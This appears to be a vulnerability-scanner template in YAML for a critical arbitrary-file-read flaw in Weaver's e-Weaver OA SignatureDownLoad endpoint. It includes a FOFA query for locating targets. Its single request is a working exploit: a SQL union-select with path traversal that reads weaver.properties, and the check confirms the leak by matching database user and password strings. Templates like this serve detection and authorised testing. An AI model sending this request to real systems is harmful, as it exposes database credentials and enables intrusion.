expression: r0()
id: e-cology-oa-e-weaver-signature-download
info:
  author: daffainfo
  description: "\u6CDB\u5FAE\u534F\u540C\u7BA1\u7406\u5E73\u53F0e-weaver\u7EE7\u627F\
    e-cology\u516B\u5927\u529F\u80FD\u6A21\u5757\u5E94\u7528\uFF0C\u5E76\u53EF\u8FDB\
    \u4E00\u6B65\u6253\u901A\u4F01\u4E1A\u66F4\u6DF1\u5C42\u7684\u4E2A\u6027\u7BA1\
    \u7406\u9700\u6C42\uFF0C\u57FA\u4E8E\u534F\u540C\u601D\u60F3\u6253\u9020\u5168\
    \u9762\u6574\u5408\u4F01\u4E1A\u7BA1\u7406\u8D44\u6E90\u7684\u73AF\u5883\u3002\
    e-weaver\u57FA\u4E8E\u5DE5\u4F5C\u6D41\u5F15\u64CE\uFF0B\u5361\u7247/\u8868\u5355\
    \uFF0B\u7EC4\u4EF6\u6A21\u5F0F\uFF0C\u5168\u9762\u5F00\u653E\u5DF2\u6709\u516B\
    \u5927\u529F\u80FD\u7684\u914D\u7F6E\u5E94\u7528\uFF0C\u540C\u65F6\u8FD8\u53EF\
    \u4EE5\u6839\u636E\u7528\u6237\u4E2A\u6027\u7684\u7BA1\u7406\u9700\u6C42\uFF0C\
    \u589E\u6DFB\u4F01\u4E1A\u72EC\u7ACB\u7684\u5E94\u7528\u6A21\u5757\u529F\u80FD\
    \uFF0C\u4ECE\u800C\u5F62\u6210\u5B8C\u5168\u7B26\u5408\u81EA\u8EAB\u4F01\u4E1A\
    \u7684\u5168\u9762\u534F\u540C\u7BA1\u7406\u5E94\u7528\u89E3\u51B3\u65B9\u6848\
    \u3002\u6CDB\u5FAEOA e-weaver\u5E73\u53F0SignatureDownLoad\u5904\u5B58\u5728\u654F\
    \u611F\u4FE1\u606F\u6CC4\u9732\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\
    \u6F0F\u6D1E\u53EF\u4EE5\u83B7\u53D6\u6570\u636E\u5E93\u670D\u52A1\u5668\u6743\
    \u9650\u3002\nfofa-query: app=\"\u6CDB\u5FAE-E-Weaver\"\n"
  name: "\u6CDB\u5FAE OA E-Weaver SignatureDownLoad \u4EFB\u610F\u6587\u4EF6\u8BFB\
    \u53D6"
  reference:
  - https://mp.weixin.qq.com/s/71v9SgVLJk2jg0kBVhkTpA
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'ecology.user=')
      && response.body.bcontains(b'ecology.password=')
    request:
      method: GET
      path: /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
